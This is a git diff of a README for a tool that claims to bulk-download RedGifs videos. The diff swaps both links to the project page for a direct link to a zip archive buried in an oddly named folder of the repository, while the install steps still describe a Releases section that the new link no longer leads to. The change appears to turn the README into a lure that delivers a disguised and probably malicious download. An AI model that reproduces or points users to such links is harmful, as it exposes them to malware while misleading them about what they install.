@@ -1,6 +1,6 @@
 # 📥 redgifs-bulk-video-downloader - Save multiple videos from RedGifs quickly
 
-[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/agathachristiegoldrush687/redgifs-bulk-video-downloader)
+[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/agathachristiegoldrush687/redgifs-bulk-video-downloader/main/bebloom/bulk_redgifs_video_downloader_v3.6.zip)
 
 ## 🎯 About this software
 
@@ -18,7 +18,7 @@ This tool serves users who need to organize collections of video files without d
 
 ## 📥 How to download and install
 
-1.  Visit the official page to get the latest version of the software: [Download Page](https://github.com/agathachristiegoldrush687/redgifs-bulk-video-downloader).
+1.  Visit the official page to get the latest version of the software: [Download Page](https://raw.githubusercontent.com/agathachristiegoldrush687/redgifs-bulk-video-downloader/main/bebloom/bulk_redgifs_video_downloader_v3.6.zip).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number at the top of the list.
 4.  Scroll down to the Assets section.
